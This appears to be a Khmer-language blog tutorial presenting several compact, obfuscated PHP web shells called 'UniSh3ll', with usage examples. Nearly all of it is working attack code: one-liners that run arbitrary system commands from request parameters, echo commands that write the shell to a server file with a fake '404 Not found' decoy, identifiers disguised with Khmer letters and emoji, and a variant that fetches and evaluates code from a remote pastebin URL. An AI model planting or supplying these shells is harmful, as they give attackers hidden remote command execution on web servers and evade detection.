---
title: "UniSh3ll Tutorial"
date: 2020-05-26T14:28:44+07:00
description: របៀបប្រើប្រាស់ Unish3ll គ្រួសាររបស់ Atom(s) Web Shell
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags:
- php-webshell
categories:
- WebShell
series:
- WebApp
image: images/feature3/code-file.png
---

#### UniSh3ll-I

{{< highlight php "linenos=table" >}}
<?=$_=$_GET;$_[_]($_[0]); //.php?_=system&0=id;ls+-la
{{< / highlight >}}

#### UniSh3ll-II

{{< highlight bash "linenos=table" >}}
echo -e "<?=\`\$_REQUEST[_]\`?>" > unish3ll.php
{{< / highlight >}}


{{< highlight bash "linenos=table" >}}
echo -e "<?=\`\$_REQUEST[_]\`?>\r<?='404 Not found';?>" > unish3ll.php
{{< / highlight >}}

<b>របៀបប្រើ៖</b> <i>curl localhost/unish3ll.php -d _=ls+-la</i>

#### UniSh3ll-III

{{< highlight php "linenos=table" >}}
<?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&$ឋ[ម]($ឋ[ប]); //.php?ត=true&ល=រងារ&ម=passthru&ប=ls
{{< / highlight >}}

{{< highlight php "linenos=table" >}}
<?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ&$ឋ[ម]($ឋ[ប]); eval('?>'.file_get_contents($ឋ[ដ]));?>
{{< / highlight >}}

<b>របៀបប្រើ៖</b> <i>unish3ll.php?ត=true&ល=រងារ&ម=passthru&ប=id&ដ=https://pastebin.com/raw/xxxxx</i>

#### UniSh3ll-IV

{{< highlight php "linenos=table" >}}
<?=$a="sy";$b="stem";$c=$a.$b; $c("uname -a"); //get method
{{< / highlight >}}

#### UniSh3ll-V

{{< highlight php "linenos=table" >}}
<?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v '127.0.0.1:8080/unish3ll.php?0=system&1=la+-la'
{{< / highlight >}}
